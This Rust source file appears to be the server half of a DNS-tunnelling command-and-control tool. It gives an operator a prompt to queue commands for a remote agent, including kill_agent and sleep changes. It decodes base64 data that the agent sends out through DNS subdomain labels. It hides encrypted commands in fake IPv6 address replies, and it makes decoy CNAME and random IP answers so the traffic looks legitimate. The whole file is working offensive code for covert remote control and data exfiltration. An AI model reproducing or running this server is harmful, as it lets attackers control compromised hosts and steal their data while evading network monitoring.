use crate::handler;
use crate::crypto;
use rustyline::DefaultEditor;
use std::process;
use rand::Rng;
use std::net::Ipv4Addr;


// Function to dynamically get command and update the COMMAND_BUFFER
pub fn get_input() {
    let mut editor = DefaultEditor::new().unwrap();

    loop {
        let line = editor.readline("#> ");

        match line {
            Ok(data) => {
                editor.add_history_entry(data.clone()).expect("[!] Couldnt push command to history");
                let temp = data.clone();

                if temp == "exit" {
                    process::exit(1);
                } else if temp == "help" {
                    println!("[+] Available commands:");
                    println!("\treconfigure_sleep INT -> Reconfigure the client's sleep interval, default is 5 secs");
                    println!("\texit -> Terminates the DNS Server process, this wont terminate the client, it will keep polling every SLEEP secs");
                    println!("\tkill_agent -> Instructs the dns client to terminate its process");
                    continue;
                } else if temp.is_empty() {
                    continue;
                }

                unsafe {
                    handler::COMMAND_BUFFER = temp.trim().to_string();
                }
            },  
            Err(e) => {
                println!("[!] Error in getting input: {}", e);
                process::exit(1);
            }
        }
    }
}


// Simple function to parse the exfiltrated data which is base64 encoded 
pub fn parse_data(requested_domain: String) -> String {
    
    let mut domain_parts: Vec<&str> = requested_domain.split(".").collect();

    // Remove the last two parts - the actual domain
    domain_parts.pop();
    domain_parts.pop();

    // Removing the first and last char from every label
    // as the client is adding them to make sure that it always starts and ends with a letter
    let temp: Vec<String> = domain_parts.iter()
                                .map(|part| {
                                    let mut cleaned = part.to_string();
                                    cleaned.remove(0);                 
                                    cleaned.remove(cleaned.len() -1);   
                                    cleaned
                                })
                                .collect();

    // Revert any changes the client made to the base64 special chars
    let joined: String = temp.join("")
                        .replace("--7", "_");

    return joined;
}


// Encode a string as a vector of IPv6 addresses
pub fn ipv6_encode(commands: &str) -> Vec<String> {
    
    // Encrypt the provided commands
    let input: String = match crypto::encrypt(commands.as_bytes()) {
        Some(e) => e,
        None => {
            return Vec::new();
        }
    };

    // Define the chunk size (16 bytes)
    let chunk_size = 16;

    // Convert the input string to bytes
    let bytes = input.as_bytes();

    let mut ipv6_addresses = Vec::new();
    
    for chunk in bytes.chunks(chunk_size) {
        // Convert the chunk to a hex string
        let hex_string: String = chunk.iter()
            .map(|b| format!("{:02x}", b))
            .collect();

        // Ensure we have enough bytes for an IPv6 address
        let mut padded_hex = hex_string.clone();
        while padded_hex.len() < 32 { // Pad to 32 hex digits (16 bytes)
            padded_hex.push('0');
        }

        // Split the hex string into groups of 4 characters (8 groups for IPv6)
        let ipv6_parts: Vec<&str> = padded_hex.as_bytes()
            .chunks(4)
            .map(|chunk| std::str::from_utf8(chunk).unwrap())
            .collect();

        // Join with colons to form an IPv6-like address
        let ipv6_like = ipv6_parts.join(":");
        ipv6_addresses.push(ipv6_like);
    }

    return ipv6_addresses;
}


// Optional functions for a more legit look xD
// Generate a response domains for the cname request
pub fn generate_cnames(request_domain: &str) -> (String, String) {

    // First prepare a clean base64 encoded version
    let cleaned: String = request_domain
        .replace("-", "");


    let len = cleaned.len();
    let cname_resp1: String;
    let cname_resp2: String;

    // Use max to avoid panic on indices
    let start1 = len.saturating_sub(22);
    let start2 = len.saturating_sub(15);

    cname_resp1 = cleaned[start1..].to_string();
    cname_resp2 = cleaned[start2..].to_string();

    // Pad the subdomain part with chars to form a valid DNS name
    let ret1: Vec<String> = cname_resp1.split(".")
                                        .enumerate()
                                        .map(|(i, x)| {
                                            if i < cname_resp1.split(".").count() - 2 {
                                                let mut part: String = x.to_string();
                                                part.insert(0, 'Y');
                                                part.push('M');
                                                part
                                            } else {
                                                x.to_string()
                                            }
                                        })
                                        .collect();

    let ret2: Vec<String> = cname_resp2.split(".")
                                        .enumerate()
                                        .map(|(i, x)| {
                                            if i < cname_resp2.split(".").count() - 2 {
                                                let mut part: String = x.to_string();
                                                part.insert(0, 'B');
                                                part.push('C');
                                                part
                                            } else {
                                                x.to_string()
                                            }
                                        })
                                        .collect();

    return (ret1.join("."), ret2.join("."));
}



// A simple function to generate a random IPv4 address
pub fn generate_ip() -> Ipv4Addr {
    let mut rng = rand::thread_rng();
    let octets: [u8; 4] = [
        rng.gen_range(1..=255),
        rng.gen_range(1..=255),
        rng.gen_range(1..=255),
        rng.gen_range(1..=255)
    ];

    return Ipv4Addr::new(octets[0], octets[1], octets[2], octets[3]);
}